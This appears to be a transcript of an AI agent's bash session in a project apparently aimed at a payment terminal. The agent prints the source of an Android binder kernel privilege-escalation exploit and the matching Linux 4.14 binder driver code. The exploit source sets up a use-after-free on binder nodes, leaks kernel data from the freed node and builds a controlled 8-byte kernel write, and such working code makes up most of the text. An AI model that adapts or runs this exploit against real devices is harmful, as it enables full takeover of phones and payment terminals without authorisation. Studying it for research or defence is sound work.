	struct binder_io msg, reply;
	struct binder_state *from = node->bs;
	uint64_t handle = node->uaf_node;
	uint8_t msg_data[0x1000], reply_data[0x1000];
	uint64_t res = -1;
	int signo;
	sigset_t set;
   uint64_t retval = 0;

	/* Enter looper. */
	binder_write(from, &looper, sizeof(looper));

	struct binder_transaction_data *t = (struct binder_transaction_data *)(msg_data + sizeof(uint32_t));
	make_transaction(msg_data, false, handle, reply_data, 0x10, NULL, 0);
	/* Fix transaction code. */
	t->code = ADD_PENDING_NODE;
	/* Make the call. */
	binder_write(from, msg_data, sizeof(*t) + sizeof(uint32_t));

	/* Poll for the answer. */
	/* Wait for BR_TRANSACTION_COMPLETE. */
	struct pollfd pfd;
	pfd.fd = from->fd;
	pfd.events = POLLIN;
	/* Wait up to a sec. */
	if (!poll(&pfd, 1, 1000)) {
		fprintf(stderr, "[-] Something went wrong will inserting the pending node.\n");
		pthread_exit(&res);
	}

	pthread_barrier_wait(&node->ready);
	
	pthread_barrier_wait(&node->ready);

   /* We wait here, until ask by the exploit to leak values from the transaction. */
   pthread_barrier_wait(&node->do_barrier); //Do leak

	/* Reading back transaction. */
	consumed = remaining = 0;


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '120,240p' bfs_ref/lpe/src/pending_node.c"}

[tool • bash]
	consumed = remaining = 0;
   uint32_t cmd;
	do {
      cmd = binder_read_next(from, reply_data, &remaining, &consumed);
   } while (cmd != BR_TRANSACTION && cmd != BR_REPLY); 

   /* Getting a BR_REPLY, would mean that we successfully cleaned up the transaction. */
   if (cmd == BR_REPLY)  {
      goto end;
   }
   
   t = (struct binder_transaction_data *)(reply_data + consumed - sizeof(*t));
	/* data at offset 0x58. */
	node->uaf_buffer = t->data.ptr.buffer;

	node->leaked_data[0] = t->target.ptr; /* data at offset 0x58. */
	node->leaked_data[1] = t->cookie;	/* data at offset 0x60. */

	/* Check the node state. */
	if (node->state == NODE_FINISHED)
		goto end;

   node->state = NODE_LEAKED;

   pthread_barrier_wait(&node->done_barrier);
   pthread_barrier_wait(&node->ready);

   /* This for sync. */

   pthread_barrier_wait(&node->do_barrier);

	/* Check the node state. */
	if (node->state == NODE_FINISHED)
		goto end;


	/* If we decide to go ahead with the buffer freeing, wait on the barrier,
	 * otherwise just exit the thread.
	 */
   binder_free_buffer(from, node->uaf_buffer);
   node->state = NODE_FREE;
end:
   pthread_barrier_wait(&node->done_barrier);
   ioctl(node->bs->fd, BINDER_THREAD_EXIT, 0);
	pthread_exit(&retval);
}



static void pending_node_create_thread(void *args)
{
	struct binder_state *bs = (struct binder_state *)*(uint64_t *)args;
	uint64_t node = *(uint64_t *)(args + 8);

	/* Create a ONE_WAY transaction to ask the endpoint to create a pending_node
	 * back to us.
	 */
	struct binder_transaction_data *t;
	uint8_t rdata[128];
	uint8_t txn_data[128];

	uint32_t remaining = 0, consumed = 0;
	struct binder_io msg, reply;

	/* Register this thread as a looper. */
	uint32_t looper = BC_ENTER_LOOPER;
	binder_write(bs, &looper, sizeof(looper));


	/* Send the ONE_WAY transaction. */
	t = (struct binder_transaction_data *)(txn_data + sizeof(uint32_t));
	make_transaction(txn_data, true, node, rdata, 0x8, NULL, 0);
	/* Fix transaction code. */
	t->code = ADD_PENDING_NODE;
	// printf("[*] About to make node\n");
	// getchar();
	/* Make the binder call. */
	binder_write(bs, txn_data, sizeof(*t) + sizeof(uint32_t));

	/* Wait for the transaction from the endpoint. */
	while (binder_read_next(bs, rdata, &remaining, &consumed) != BR_TRANSACTION);


	// printf("[*] Node should be made\n");
	// getchar();

	/* Get transaction. */
	t = (struct binder_transaction_data *)(rdata + consumed - sizeof(*t));

	if (t->code != ADD_PENDING_NODE) {
		fprintf(stderr, "[-] Invalid transaction code %x. Expected %x\n", t->code, ADD_PENDING_NODE);
		exit(1);
	}

	/* Free the buffer. */
	binder_free_buffer(bs, t->data.ptr.buffer);

	/* Okay, so instead of a reply, we send a new transaction here, in order to have the thing go into the pending node list. */
	t = (struct binder_transaction_data *)(txn_data + sizeof(uint32_t));
	make_transaction(txn_data, false, node, rdata, 0x10, NULL, 0);
	/* Fix transaction code. */
	t->code = ADD_PENDING_NODE;
	/* Make the call. */
	binder_write(bs, txn_data, sizeof(*t) + sizeof(uint32_t));

	int res = 0;
	pthread_exit(&res);
}

/*
 * The endpoint calls into this function to setup a pending node.
 */
pthread_t add_pending_node(struct binder_state *from, uint64_t pending_node)
{
	pthread_t th;

	struct pending_node *node = NULL;

	/* Create new pending_node */
	node = pending_node_new();
	if (!node)


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '240,400p' bfs_ref/lpe/src/pending_node.c"}

[tool • bash]
	if (!node)
		return NULL;

	node->bs = from;
	node->uaf_node = pending_node;

	if (pthread_create(&th, NULL, pending_node_thread, (void *)node)) {
		perror("pthread");
		return (pthread_t)-1;
	}

	node->uaf_node_th = th;
	last_node_th = th;

	pthread_barrier_wait(&node->ready);
	
   return th;
}


/*
 * The endpoint calls into this function to
 * remove a specific pending node.
 */
void terminate_pending_node(pthread_t th)
{
	/* Just unlock the barrier, and pthread_join */
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return ;


   pthread_barrier_wait(&node->ready);
   node->state = NODE_FINISHED;
   node->uaf_buffer = 0;
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
	pthread_join(node->uaf_node_th, NULL);

	/* Remove node. */
	
	struct pending_node *tmp = pending_nodes;
	if (tmp == node) {
		pending_nodes = node->next;

	} else {
		while (tmp->next != node)
			tmp = tmp->next;

		tmp->next = node->next;
	}
	free(node);
}


/*
 * Perform a ADD_PENDING_NODE binder query, in order to ask the remote
 * endpoint to create a pending node transaction.
 */
pthread_t pending_node_create(struct binder_state *bs, uint64_t node)
{
	uint64_t args[] = {bs, node};
	pthread_t th;

	if (pthread_create(&th, NULL, pending_node_create_thread, (void *)args)) {
		perror("pthread create\n");
		exit(0);
	}

	pthread_join(th, NULL);

	return last_node_th;
}

void pending_node_free(struct binder_state *bs, uint64_t node, uint64_t vma_start, uint32_t strong, uint32_t weak, bool second)
{
	/* So we have our pending node in another thread. Now release our reference to uaf_node
	 * and trigger the bug (3 times needs) to free the uaf_node, while the pending node thread keeps
	 * a reference to it (as target_node)
	 */
	int i;
	for (i = 0; i < strong; i++)
		dec_node(bs, node, vma_start, true, second);

	for (i = 0; i < weak; i++)
		dec_node(bs, node, vma_start, false, second);
}

/*
 * Trigger a write8, by having the pending node thread
 * calling BC_FREE_BUFFER, which will enter the
 * `binder_dec_node()` function with (hopefully) controlled
 * `binder_node`, ultimately leading to a controlled
 * write8
 */
void pending_node_write8(pthread_t th)
{
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return ;
	/* Buffer release. */

   pthread_barrier_wait(&node->ready);
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
   pthread_join(th, NULL);
	
   struct pending_node *tmp = pending_nodes;
	if (tmp == node) {
		pending_nodes = node->next;

	} else {
		while (tmp->next != node)
			tmp = tmp->next;

		tmp->next = node->next;
	}

	free(node);
}

/*
 * Kindly ask the endpoint to terminate a specific pending node thread.
 */
void pending_node_terminate(struct binder_state *bs, uint64_t handle, pthread_t th)
{
	uint8_t txn_data[0x100];
	uint8_t reply_data[0x100];
	struct binder_io msg, reply;


	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, reply_data, sizeof(reply_data), 10);

	bio_put_uint32(&msg, (uint32_t)th);
	bio_put_uint32(&msg, (uint32_t)((uint64_t)(th)>>32));
	binder_call(bs, &msg, &reply, handle, TERMINATE_PENDING_NODE);

	binder_free_buffer(bs, reply.data0);
}

/*
 * Leak the 2 qword of data from the UAFed pending node.
 * It has the side effect or terminating the pending_node_thread
 */
void pending_node_leak(pthread_t th, uint64_t *q1, uint64_t *q2)
{
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return;
	/* Okay spray epoll structures. */
   pthread_barrier_wait(&node->ready);
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
	/* Inspecting node value. */

	if (q1)
		*q1 = node->leaked_data[0];
	if (q2)
		*q2 = node->leaked_data[1];
}


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -rn \"BINDER_BUFFER_SZ\\|RESERVED_BUFFER_SZ\\|NEPITEMS\\|NREALLOC\\|BUFSZ\\|MAX\" bfs_ref/lpe/include/*.h bfs_ref/lpe/src/*.c 2>/dev/null | grep define; echo ====; grep -n \"TRIGGER_DECREF\\|ADD_PENDING_NODE\\|EXCHANGE_HANDLES\\|GET_VMA_START\\|RESERVE\\|TERMINATE\\|FREE_RESERVED\" bfs_ref/lpe/include/endpoint.h bfs_ref/lpe/src/endpoint.c | head -20"}

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '1,150p' bfs_ref/lpe/src/endpoint.c | grep -v \"^\\s*/\\*\" | sed -n '1,90p'"}

[tool • bash]
bfs_ref/lpe/include/realloc.h:4:#define NREALLOC 0x80 * 8
bfs_ref/lpe/include/realloc.h:5:#define BUFSZ	0x80
bfs_ref/lpe/include/uapi_binder.h:252:#define BINDER_SET_MAX_THREADS		_IOW('b', 5, __u32)
bfs_ref/lpe/src/binder.c:18:#define MAX_BIO_SIZE (1 << 30)
bfs_ref/lpe/src/exploit.c:24:#define BINDER_BUFFER_SZ	128 * 1024
bfs_ref/lpe/src/exploit.c:25:#define RESERVED_BUFFER_SZ	127 * 1024
bfs_ref/lpe/src/node.c:193:#define NEPITEMS  0x20
====
bfs_ref/lpe/include/endpoint.h:21:	GET_VMA_START = 0,
bfs_ref/lpe/include/endpoint.h:22:	EXCHANGE_HANDLES,
bfs_ref/lpe/include/endpoint.h:23:	ADD_PENDING_NODE,
bfs_ref/lpe/include/endpoint.h:24:	TERMINATE_PENDING_NODE,
bfs_ref/lpe/include/endpoint.h:25:	RESERVE_BUFFER,
bfs_ref/lpe/include/endpoint.h:26:	FREE_RESERVED_BUFFER,
bfs_ref/lpe/include/endpoint.h:27:	TRIGGER_DECREF,
bfs_ref/lpe/src/endpoint.c:30:		case GET_VMA_START:
bfs_ref/lpe/src/endpoint.c:36:		case EXCHANGE_HANDLES:
bfs_ref/lpe/src/endpoint.c:51:		case ADD_PENDING_NODE:
bfs_ref/lpe/src/endpoint.c:57:		case TERMINATE_PENDING_NODE:
bfs_ref/lpe/src/endpoint.c:62:		case RESERVE_BUFFER:
bfs_ref/lpe/src/endpoint.c:73:		case FREE_RESERVED_BUFFER:
bfs_ref/lpe/src/endpoint.c:80:		case TRIGGER_DECREF:


[tool • bash]
#include <sched.h>
#include <stdio.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <poll.h>
#include <sys/epoll.h>
#include <errno.h>
#include <setjmp.h>

#include "binder.h"
#include "handle.h"
#include "log.h"
#include "endpoint.h"
#include "pending_node.h"


static struct endpoint_handle *endpoints = NULL;

static int endpoint_transaction_handler(struct endpoint_handle *handle, struct binder_transaction_data *tr, struct binder_io *msg, struct binder_io *reply)
{

	int res = 1;
	struct binder_state *bs = handle->bs;
	pthread_t th;

	switch (tr->code) {
		case GET_VMA_START:
			bio_put_uint32(reply, (uint32_t)bs->mapped);
			bio_put_uint32(reply, (uint32_t)(((uint64_t)(bs->mapped)>>32)));
			res = 0;
			break;
		case EXCHANGE_HANDLES:
			handle->client_handle = bio_get_ref(msg);
			binder_acquire(bs, handle->client_handle);

			bio_put_obj(reply, bs->mapped + 0xe8);
			uint64_t node2 = bs->mapped + 0xe8;
			node2 = node2 & 0xFFFFFFFF;
			node2 = node2 << 32;
			node2 += 0x42;

			bio_put_obj(reply, node2);
			res = 0;
			break;
		case ADD_PENDING_NODE:
			add_pending_node(bs, handle->client_handle);
			//uaf_node_th = add_pending_node(bs, client_handle);
			//log_info("uaf_node_th: %p\n", uaf_node_th);
			res = 0;
			break;
		case TERMINATE_PENDING_NODE:
			th = bio_get_uint32(msg) + (((uint64_t)bio_get_uint32(msg)) << 32);
			terminate_pending_node(th);
			res = 0;
			break;
		case RESERVE_BUFFER:
			if (handle->reserved_buffer) {
				log_err("A buffer is already reserved. Free it if you want to reserve another one.\n");
				res = -1;
				break;
			}
			else {
				handle->reserved_buffer = tr->data.ptr.buffer;
				res = 42; /* Instruct the calling function to skip freeing the buffer. */
			}
			break;
		case FREE_RESERVED_BUFFER:
			if (handle->reserved_buffer) {
				binder_free_buffer(bs, handle->reserved_buffer);
				handle->reserved_buffer = 0;
			}
			res = 0;
			break;
		case TRIGGER_DECREF:
			res = 0;
			break;
		default:
			log_err("[-] Unknown transaction code.\n");
			break;
	}


	return res;

}

static struct endpoint_handle *_lookup_by_name(const char *name)


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '150,343p' bfs_ref/lpe/src/endpoint.c | grep -n \"endpoint_thread\\|BC_ENTER_LOOPER\\|binder_read_next\\|BR_TRANSACTION\\|res == 42\\|res ==\\|binder_send_reply\\|TF_ONE_WAY\\|binder_free_buffer\\|one_way\\|plop\\|signal\\|clone\\|endpoint_thread\\|bootstrap_endpoint\" | head -40"}

[tool • bash]
4:	signal(SIGTERM, plop);
19:	uint32_t looper = BC_ENTER_LOOPER;
33:	while ((cmd = binder_read_next(handle->bs, data, &remaining, &consumed))) {
37:			case BR_TRANSACTION: {
47:				if (tr->flags & TF_ONE_WAY) {
48:					if (res == 42)
50:					binder_free_buffer(handle->bs, tr->data.ptr.buffer);
52:					if (res == 42)
54:						binder_send_reply(handle->bs, &reply, NULL, 0);
56:						binder_send_reply(handle->bs, &reply, tr->data.ptr.buffer, 0);
116:bool bootstrap_endpoint(const char *endpoint_name)
145:	handle->pid = clone(endpoint_thread, handle->stack + 65536, CLONE_VM|SIGCHLD, handle);


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '150,210p' bfs_ref/lpe/src/endpoint.c"}

[tool • bash]

	setjmp(handle->env);

	signal(SIGTERM, plop);

	handle->bs = binder_open(BINDER_DEVICE, 128 * 1024);
	if (!handle->bs) {
		log_err("[-] Failed to open binder device.\n");
		goto error;
	}

	/* Publish our endpoint name using the fake system server of our APK. */
	if (!publish_handle(handle->bs, 0x42, handle->name)) {
		log_err("[-] Failed to publish handle\n");
		goto error;
	}

	/* Enter looper. */
	uint32_t looper = BC_ENTER_LOOPER;
	binder_write(handle->bs, &looper, sizeof(looper));

	/* Everything's fine. */
	handle->status = 1;
	pthread_barrier_wait(&handle->barrier);

	/* We do this "manually" and don't rely to much on the binder api because
	 * we do some weird things.
	 */
	uint32_t cmd;
	struct binder_transaction_data *tr;


	while ((cmd = binder_read_next(handle->bs, data, &remaining, &consumed))) {
		switch (cmd) {
			case BR_DECREFS:
				break;
			case BR_TRANSACTION: {
				uint8_t rdata[256];
				struct binder_io msg;
				struct binder_io reply;
				int res;

				tr = (struct binder_transaction_data *)(data + consumed - sizeof(*tr));
				bio_init(&reply, rdata, sizeof(rdata), 4);
				bio_init_from_txn(&msg, tr);
				res = endpoint_transaction_handler(handle, tr, &msg, &reply);
				if (tr->flags & TF_ONE_WAY) {
					if (res == 42)
						continue;
					binder_free_buffer(handle->bs, tr->data.ptr.buffer);
				} else {
					if (res == 42)
						/* we reply, but skip freing the buffer. */
						binder_send_reply(handle->bs, &reply, NULL, 0);
					else
						binder_send_reply(handle->bs, &reply, tr->data.ptr.buffer, 0);
				}	
				break;
		        }
			default:
				break;


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -n \"num_valid\\|binder_validate_ptr\\|binder_validate_fixup\\|binder_fixup_parent\" kern_ref/414_binder.c | head -25"}

[tool • bash]
1998: * binder_validate_ptr() - validates binder_buffer_object in a binder_buffer.
2003: * @num_valid:	the number of valid offsets in the offset array
2006: *		described by @start and @num_valid, and if there's a valid
2011: *		verified; this function assumes that @num_valid elements
2014:static struct binder_buffer_object *binder_validate_ptr(struct binder_buffer *b,
2017:							binder_size_t num_valid)
2022:	if (index >= num_valid)
2034: * binder_validate_fixup() - validates pointer/fd fixups happen in order.
2071:static bool binder_validate_fixup(struct binder_buffer *b,
2191:			parent = binder_validate_ptr(buffer, fda->parent,
2470:static int binder_fixup_parent(struct binder_transaction *t,
2474:			       binder_size_t num_valid,
2487:	parent = binder_validate_ptr(b, bp->parent, off_start, num_valid);
2494:	if (!binder_validate_fixup(b, off_start,
2985:				binder_validate_ptr(t->buffer, fda->parent,
2996:			if (!binder_validate_fixup(t->buffer, off_start,
3048:			ret = binder_fixup_parent(t, thread, bp, off_start,


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '2104,2115p;2195,2215p' kern_ref/414_binder.c; echo ====FIXUP; sed -n '2470,2520p' kern_ref/414_binder.c"}

[tool • bash]
	binder_debug(BINDER_DEBUG_TRANSACTION,
		     "%d buffer release %d, size %zd-%zd, failed at %p\n",
		     proc->pid, buffer->debug_id,
		     buffer->data_size, buffer->offsets_size, failed_at);

	if (buffer->target_node)
		binder_dec_node(buffer->target_node, 1, 0);

	off_start = (binder_size_t *)(buffer->data +
				      ALIGN(buffer->data_size, sizeof(void *)));
	if (failed_at)
		off_end = failed_at;
				pr_err("transaction release %d bad parent offset",
				       debug_id);
				continue;
			}
			/*
			 * Since the parent was already fixed up, convert it
			 * back to kernel address space to access it
			 */
			parent_buffer = parent->buffer -
				binder_alloc_get_user_buffer_offset(
						&proc->alloc);

			fd_buf_size = sizeof(u32) * fda->num_fds;
			if (fda->num_fds >= SIZE_MAX / sizeof(u32)) {
				pr_err("transaction release %d invalid number of fds (%lld)\n",
				       debug_id, (u64)fda->num_fds);
				continue;
			}
			if (fd_buf_size > parent->length ||
			    fda->parent_offset > parent->length - fd_buf_size) {
				/* No space for all file descriptors here. */
====FIXUP
static int binder_fixup_parent(struct binder_transaction *t,
			       struct binder_thread *thread,
			       struct binder_buffer_object *bp,
			       binder_size_t *off_start,
			       binder_size_t num_valid,
			       struct binder_buffer_object *last_fixup_obj,
			       binder_size_t last_fixup_min_off)
{
	struct binder_buffer_object *parent;
	u8 *parent_buffer;
	struct binder_buffer *b = t->buffer;
	struct binder_proc *proc = thread->proc;
	struct binder_proc *target_proc = t->to_proc;

	if (!(bp->flags & BINDER_BUFFER_FLAG_HAS_PARENT))
		return 0;

	parent = binder_validate_ptr(b, bp->parent, off_start, num_valid);
	if (!parent) {
		binder_user_error("%d:%d got transaction with invalid parent offset or type\n",
				  proc->pid, thread->pid);
		return -EINVAL;
	}

	if (!binder_validate_fixup(b, off_start,
				   parent, bp->parent_offset,
				   last_fixup_obj,
				   last_fixup_min_off)) {
		binder_user_error("%d:%d got transaction with out-of-order buffer fixup\n",
				  proc->pid, thread->pid);
		return -EINVAL;
	}

	if (parent->length < sizeof(binder_uintptr_t) ||
	    bp->parent_offset > parent->length - sizeof(binder_uintptr_t)) {
		/* No space for a pointer here! */
		binder_user_error("%d:%d got transaction with invalid parent offset\n",
				  proc->pid, thread->pid);
		return -EINVAL;
	}
	parent_buffer = (u8 *)((uintptr_t)parent->buffer -
			binder_alloc_get_user_buffer_offset(
				&target_proc->alloc));
	*(binder_uintptr_t *)(parent_buffer + bp->parent_offset) = bp->buffer;

	return 0;
}

/**
 * binder_proc_transaction() - sends a transaction to a process and wakes it up
 * @t:		transaction to send


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '2960,3060p' kern_ref/414_binder.c"}

[tool • bash]
				return_error = BR_FAILED_REPLY;
				return_error_param = ret;
				return_error_line = __LINE__;
				goto err_translate_failed;
			}
		} break;

		case BINDER_TYPE_FD: {
			struct binder_fd_object *fp = to_binder_fd_object(hdr);
			int target_fd = binder_translate_fd(fp->fd, t, thread,
							    in_reply_to);

			if (target_fd < 0) {
				return_error = BR_FAILED_REPLY;
				return_error_param = target_fd;
				return_error_line = __LINE__;
				goto err_translate_failed;
			}
			fp->pad_binder = 0;
			fp->fd = target_fd;
		} break;
		case BINDER_TYPE_FDA: {
			struct binder_fd_array_object *fda =
				to_binder_fd_array_object(hdr);
			struct binder_buffer_object *parent =
				binder_validate_ptr(t->buffer, fda->parent,
						    off_start,
						    offp - off_start);
			if (!parent) {
				binder_user_error("%d:%d got transaction with invalid parent offset or type\n",
						  proc->pid, thread->pid);
				return_error = BR_FAILED_REPLY;
				return_error_param = -EINVAL;
				return_error_line = __LINE__;
				goto err_bad_parent;
			}
			if (!binder_validate_fixup(t->buffer, off_start,
						   parent, fda->parent_offset,
						   last_fixup_obj,
						   last_fixup_min_off)) {
				binder_user_error("%d:%d got transaction with out-of-order buffer fixup\n",
						  proc->pid, thread->pid);
				return_error = BR_FAILED_REPLY;
				return_error_param = -EINVAL;
				return_error_line = __LINE__;
				goto err_bad_parent;
			}
			ret = binder_translate_fd_array(fda, parent, t, thread,
							in_reply_to);
			if (ret < 0) {
				return_error = BR_FAILED_REPLY;
				return_error_param = ret;
				return_error_line = __LINE__;
				goto err_translate_failed;
			}
			last_fixup_obj = parent;
			last_fixup_min_off =
				fda->parent_offset + sizeof(u32) * fda->num_fds;
		} break;
		case BINDER_TYPE_PTR: {
			struct binder_buffer_object *bp =
				to_binder_buffer_object(hdr);
			size_t buf_left = sg_buf_end - sg_bufp;

			if (bp->length > buf_left) {
				binder_user_error("%d:%d got transaction with too large buffer\n",
						  proc->pid, thread->pid);
				return_error = BR_FAILED_REPLY;
				return_error_param = -EINVAL;
				return_error_line = __LINE__;
				goto err_bad_offset;
			}
			if (copy_from_user(sg_bufp,
					   (const void __user *)(uintptr_t)
					   bp->buffer, bp->length)) {
				binder_user_error("%d:%d got transaction with invalid offsets ptr\n",
						  proc->pid, thread->pid);
				return_error_param = -EFAULT;
				return_error = BR_FAILED_REPLY;
				return_error_line = __LINE__;
				goto err_copy_data_failed;
			}
			/* Fixup buffer pointer to target proc address space */
			bp->buffer = (uintptr_t)sg_bufp +
				binder_alloc_get_user_buffer_offset(
						&target_proc->alloc);
			sg_bufp += ALIGN(bp->length, sizeof(u64));

			ret = binder_fixup_parent(t, thread, bp, off_start,
						  offp - off_start,
						  last_fixup_obj,
						  last_fixup_min_off);
			if (ret < 0) {
				return_error = BR_FAILED_REPLY;
				return_error_param = ret;
				return_error_line = __LINE__;
				goto err_translate_failed;
			}
			last_fixup_obj = bp;
			last_fixup_min_off = 0;
		} break;


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -n \"num_valid = \\|(buffer_offset\\|off_start \\* \\|\\* 8\\|\\* 4\" kern_ref/414_binder.c | grep -in \"num_valid\\|\\*8\\|\\*4\" | head; echo ===; grep -n \"binder_transaction(struct binder_proc\" kern_ref/414_binder.c; sed -n '/num_valid/,+4p' kern_ref/414_binder.c | head -20"}

[tool • bash]
===
2627:static void binder_transaction(struct binder_proc *proc,
 * @num_valid:	the number of valid offsets in the offset array
 *
 * Return:	If @index is within the valid range of the offset array
 *		described by @start and @num_valid, and if there's a valid
 *		binder_buffer_object at the offset found in index @index
 *		verified; this function assumes that @num_valid elements
 *		from @start were previously verified to have valid offsets.
 */
static struct binder_buffer_object *binder_validate_ptr(struct binder_buffer *b,
							binder_size_t index,
							binder_size_t num_valid)
{
	struct binder_buffer_object *buffer_obj;
	binder_size_t *offp;

	if (index >= num_valid)
		return NULL;

	offp = start + index;
	buffer_obj = (struct binder_buffer_object *)(b->data + *offp);


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && awk 'NR>=2860 && NR<=2960' kern_ref/414_binder.c"}

[tool • bash]
	t->buffer = binder_alloc_new_buf(&target_proc->alloc, tr->data_size,
		tr->offsets_size, extra_buffers_size,
		!reply && (t->flags & TF_ONE_WAY));
	if (IS_ERR(t->buffer)) {
		/*
		 * -ESRCH indicates VMA cleared. The target is dying.
		 */
		return_error_param = PTR_ERR(t->buffer);
		return_error = return_error_param == -ESRCH ?
			BR_DEAD_REPLY : BR_FAILED_REPLY;
		return_error_line = __LINE__;
		t->buffer = NULL;
		goto err_binder_alloc_buf_failed;
	}
	t->buffer->allow_user_free = 0;
	t->buffer->debug_id = t->debug_id;
	t->buffer->transaction = t;
	t->buffer->target_node = target_node;
	trace_binder_transaction_alloc_buf(t->buffer);
	off_start = (binder_size_t *)(t->buffer->data +
				      ALIGN(tr->data_size, sizeof(void *)));
	offp = off_start;

	if (copy_from_user(t->buffer->data, (const void __user *)(uintptr_t)
			   tr->data.ptr.buffer, tr->data_size)) {
		binder_user_error("%d:%d got transaction with invalid data ptr\n",
				proc->pid, thread->pid);
		return_error = BR_FAILED_REPLY;
		return_error_param = -EFAULT;
		return_error_line = __LINE__;
		goto err_copy_data_failed;
	}
	if (copy_from_user(offp, (const void __user *)(uintptr_t)
			   tr->data.ptr.offsets, tr->offsets_size)) {
		binder_user_error("%d:%d got transaction with invalid offsets ptr\n",
				proc->pid, thread->pid);
		return_error = BR_FAILED_REPLY;
		return_error_param = -EFAULT;
		return_error_line = __LINE__;
		goto err_copy_data_failed;
	}
	if (!IS_ALIGNED(tr->offsets_size, sizeof(binder_size_t))) {
		binder_user_error("%d:%d got transaction with invalid offsets size, %lld\n",
				proc->pid, thread->pid, (u64)tr->offsets_size);
		return_error = BR_FAILED_REPLY;
		return_error_param = -EINVAL;
		return_error_line = __LINE__;
		goto err_bad_offset;
	}
	if (!IS_ALIGNED(extra_buffers_size, sizeof(u64))) {
		binder_user_error("%d:%d got transaction with unaligned buffers size, %lld\n",
				  proc->pid, thread->pid,
				  (u64)extra_buffers_size);
		return_error = BR_FAILED_REPLY;
		return_error_param = -EINVAL;
		return_error_line = __LINE__;
		goto err_bad_offset;
	}
	off_end = (void *)off_start + tr->offsets_size;
	sg_bufp = (u8 *)(PTR_ALIGN(off_end, sizeof(void *)));
	sg_buf_end = sg_bufp + extra_buffers_size;
	off_min = 0;
	for (; offp < off_end; offp++) {
		struct binder_object_header *hdr;
		size_t object_size = binder_validate_object(t->buffer, *offp);

		if (object_size == 0 || *offp < off_min) {
			binder_user_error("%d:%d got transaction with invalid offset (%lld, min %lld max %lld) or object.\n",
					  proc->pid, thread->pid, (u64)*offp,
					  (u64)off_min,
					  (u64)t->buffer->data_size);
			return_error = BR_FAILED_REPLY;
			return_error_param = -EINVAL;
			return_error_line = __LINE__;
			goto err_bad_offset;
		}

		hdr = (struct binder_object_header *)(t->buffer->data + *offp);
		off_min = *offp + object_size;
		switch (hdr->type) {
		case BINDER_TYPE_BINDER:
		case BINDER_TYPE_WEAK_BINDER: {
			struct flat_binder_object *fp;

			fp = to_flat_binder_object(hdr);
			ret = binder_translate_binder(fp, t, thread);
			if (ret < 0) {
				return_error = BR_FAILED_REPLY;
				return_error_param = ret;
				return_error_line = __LINE__;
				goto err_translate_failed;
			}
		} break;
		case BINDER_TYPE_HANDLE:
		case BINDER_TYPE_WEAK_HANDLE: {
			struct flat_binder_object *fp;

			fp = to_flat_binder_object(hdr);
			ret = binder_translate_handle(fp, t, thread);
			if (ret < 0) {
				return_error = BR_FAILED_REPLY;


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '2080,2104p' kern_ref/414_binder.c"}

[tool • bash]
		return false;
	}

	while (last_obj != buffer) {
		/*
		 * Safe to retrieve the parent of last_obj, since it
		 * was already previously verified by the driver.
		 */
		if ((last_obj->flags & BINDER_BUFFER_FLAG_HAS_PARENT) == 0)
			return false;
		last_min_offset = last_obj->parent_offset + sizeof(uintptr_t);
		last_obj = (struct binder_buffer_object *)
			(b->data + *(objects_start + last_obj->parent));
	}
	return (fixup_offset >= last_min_offset);
}

static void binder_transaction_buffer_release(struct binder_proc *proc,
					      struct binder_buffer *buffer,
					      binder_size_t *failed_at)
{
	binder_size_t *offp, *off_start, *off_end;
	int debug_id = buffer->debug_id;

	binder_debug(BINDER_DEBUG_TRANSACTION,


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '2104,2200p' kern_ref/414_binder.c"}

[tool • bash]
	binder_debug(BINDER_DEBUG_TRANSACTION,
		     "%d buffer release %d, size %zd-%zd, failed at %p\n",
		     proc->pid, buffer->debug_id,
		     buffer->data_size, buffer->offsets_size, failed_at);

	if (buffer->target_node)
		binder_dec_node(buffer->target_node, 1, 0);

	off_start = (binder_size_t *)(buffer->data +
				      ALIGN(buffer->data_size, sizeof(void *)));
	if (failed_at)
		off_end = failed_at;
	else
		off_end = (void *)off_start + buffer->offsets_size;
	for (offp = off_start; offp < off_end; offp++) {
		struct binder_object_header *hdr;
		size_t object_size = binder_validate_object(buffer, *offp);

		if (object_size == 0) {
			pr_err("transaction release %d bad object at offset %lld, size %zd\n",
			       debug_id, (u64)*offp, buffer->data_size);
			continue;
		}
		hdr = (struct binder_object_header *)(buffer->data + *offp);
		switch (hdr->type) {
		case BINDER_TYPE_BINDER:
		case BINDER_TYPE_WEAK_BINDER: {
			struct flat_binder_object *fp;
